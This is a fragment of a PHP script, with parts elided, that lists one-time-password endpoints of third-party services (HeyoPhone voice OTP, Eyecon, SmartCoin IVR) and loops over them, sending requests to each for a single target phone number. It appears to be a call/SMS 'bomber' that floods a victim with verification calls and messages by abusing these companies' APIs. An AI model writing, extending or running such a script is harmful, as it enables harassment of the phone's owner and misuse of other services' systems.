...
<body>
    ...
    // ============ NEWLY ADDED APIS (HeyoPhone, Eyecon, SmartCoin IVR) ============
    // API 17: HeyoPhone - Voice OTP
    [
        "url" => "https://api.heyophone.com/heyo/v1/otp/send",
        "data" => json_encode(["country_code" => "+91", "number" => $mobile, "via" => "call"]),
        "headers" => [
    ...
    // API 18: Eyecon App - GET transport
    [
    ...
    // API 19: SmartCoin - IVR OTP (Channel: IVR)
    [
        "url" => "https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request",
        "data" => json_encode([
            "phone_number" => $mobile,
    ...
    [
        ...
        foreach ($apis as $index => $api) {
            ...
            // Check if method is GET (for Eyecon API)
            ...
            // Set POST fields only if not GET method
            if (!isset($api['method']) || $api['method'] != 'GET') {
